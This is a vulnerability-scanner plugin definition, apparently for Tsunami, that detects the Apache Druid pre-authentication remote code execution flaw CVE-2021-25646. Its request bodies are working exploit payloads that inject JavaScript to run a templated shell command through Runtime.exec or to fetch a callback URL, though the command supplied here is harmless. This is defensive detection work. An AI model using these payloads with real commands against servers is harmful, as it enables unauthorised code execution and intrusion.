# proto-file: proto/templated_plugin.proto
# proto-message: TemplatedPlugin

###############
# PLUGIN INFO #
###############

info: {
  type: VULN_DETECTION
  name: "ApacheDruid_CVE_2021_25646"
  author: 
    "Robert Dick (robert@doyensec.com) for the templated version, "
    "threedr3am (qiaoer1320@gmail.com) for the original Java version"
  version: "0.1"
}

finding: {
  main_id: {
    publisher: "TSUNAMI_COMMUNITY"
    value: "CVE_2021_25646"
  }
  severity: CRITICAL
  title: "Apache Druid Pre-Auth RCE vulnerability (CVE-2021-25646)"
  description: 
    "Apache Druid includes the ability to execute user-provided JavaScript code "
    "embedded in various types of requests. "
    "This functionality is intended for use in high-trust environments, "
    "and is disabled by default. "
    "However, in Druid 0.20.0 and earlier, it is possible for an "
    "authenticated user "
    "to send a specially-crafted request that forces Druid to run "
    "user-provided "
    "JavaScript code for that request, regardless of server configuration. "
    "This can be leveraged to execute code on the target machine with the "
    "privileges of the Druid server process."
    "https://nvd.nist.gov/vuln/detail/CVE-2021-25646"
  recommendation: "Update to 0.20.1 or later."
  related_id: {
    publisher: "CVE"
    value: "CVE-2021-25646"
  }
}

config: {}

###########
# ACTIONS #
###########

actions: {
  name: "fingerprint_druid"
  http_request: {
    method: GET
    uri: "/"
    response: {
      http_status: 200
      expect_all: {
        conditions: [
          { body: {} contains: "<title>Apache Druid</title>" }
        ]
      }
    }
  }
}

# uses java's built-in URL fetch to reduce false negatives where curl or wget might not exist

actions: {
  name: "trigger_rce_oob"
  http_request: {
    method: POST
    uri: "/druid/indexer/v1/sampler"
    headers: [
      { name: "Content-Type" value: "application/json" }
    ]
    data: 
      '{'
      '  "type": "index",'
      '  "spec": {'
      '    "ioConfig": {'
      '      "type": "index",'
      '      "firehose": {'
      '        "type": "local",'
      '        "baseDir": "/etc",'
      '        "filter": "*"'
      '      }'
      '    },'
      '    "dataSchema": {'
      '      "dataSource": "xxxxxx",'
      '      "parser": {'
      '        "parseSpec": {'
      '          "format": "javascript",'
      '          "timestampSpec": {},'
      '          "dimensionsSpec": {},'
      '          "function": "function() {var fileContent = new java.net.URL(\\\"{{ T_CBS_URI }}\\\").openStream();return {timestamp:\\\"1622212345709\\\",kadkand: \\\"abc\\\"}}",'
      '          "": {'
      '            "enabled": "true"'
      '          }'
      '        }'
      '      }'
      '    }'
      '  },'
      '  "samplerConfig": {'
      '    "numRows": 10'
      '  }'
      '}'
      ''
  }
}

actions: {
  name: "trigger_rce_reflective"
  http_request: {
    method: POST
    uri: "/druid/indexer/v1/sampler"
    headers: [
      { name: "Content-Type" value: "application/json" }
    ]
    data: 
      '{'
      '  "type": "index",'
      '  "spec": {'
      '    "ioConfig": {'
      '      "type": "index",'
      '      "firehose": {'
      '        "type": "local",'
      '        "baseDir": "/etc",'
      '        "filter": "*"'
      '      }'
      '    },'
      '    "dataSchema": {'
      '      "dataSource": "xxxxxx",'
      '      "parser": {'
      '        "parseSpec": {'
      '          "format": "javascript",'
      '          "timestampSpec": {},'
      '          "dimensionsSpec": {},'
      '          "function": "function(){var fileContent = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\\\"{{ PAYLOAD }}\\\").getInputStream()).useDelimiter(\\\"\\\\A\\\").next();return {timestamp:\\\"1622212345709\\\",kadkand: fileContent}}",'
      '          "": {'
      '            "enabled": "true"'
      '          }'
      '        }'
      '      }'
      '    }'
      '  },'
      '  "samplerConfig": {'
      '    "numRows": 10'
      '  }'
      '}'
      ''
    response: {
      expect_all: {
        conditions: [
          { body: {} contains: "{{ PATTERN }}" }
        ]
      }
    }
  }
}

actions: {
  name: "sleep"
  utility: { sleep: { duration_ms: 5000 } }
}

actions: {
  name: "check_callback"
  callback_server: { action_type: CHECK }
}

#############
# WORKFLOWS #
#############

workflows: {
  condition: REQUIRES_CALLBACK_SERVER
  actions: [
    "fingerprint_druid",
    "trigger_rce_oob",
    "sleep",
    "check_callback"
  ]
}

workflows: {
  variables: [
    { name: "PAYLOAD" value: "printf %x 133713371337" },
    { name: "PATTERN" value: "1f21f020c9" }
  ]
  actions: [
    "fingerprint_druid",
    "trigger_rce_reflective"
  ]
}

